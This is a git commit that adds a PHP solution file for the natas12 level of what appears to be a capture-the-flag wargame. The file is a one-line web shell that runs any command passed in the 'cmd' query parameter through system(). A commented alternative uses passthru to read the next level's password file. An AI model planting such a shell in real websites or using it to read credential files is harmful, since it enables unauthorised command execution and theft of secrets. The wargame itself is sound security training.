e888d9e91d5546c08d1f058e3514d6fb1236c158
BigFish2086 <a8686.ibrahim@gmail.com>
2021-11-08 04:49:52 +0200

    add natas12 challenge solution

---
+++ natas12/natas12.php
@@ -0,0 +1,9 @@
+<?php
+
+//we can get a cmd to run our commands through
+system($_GET['cmd']);
+
+//or we can run our desired command direct through the following
+//passthru('cat /etc/natas_webpass/natas13');
+
+?>
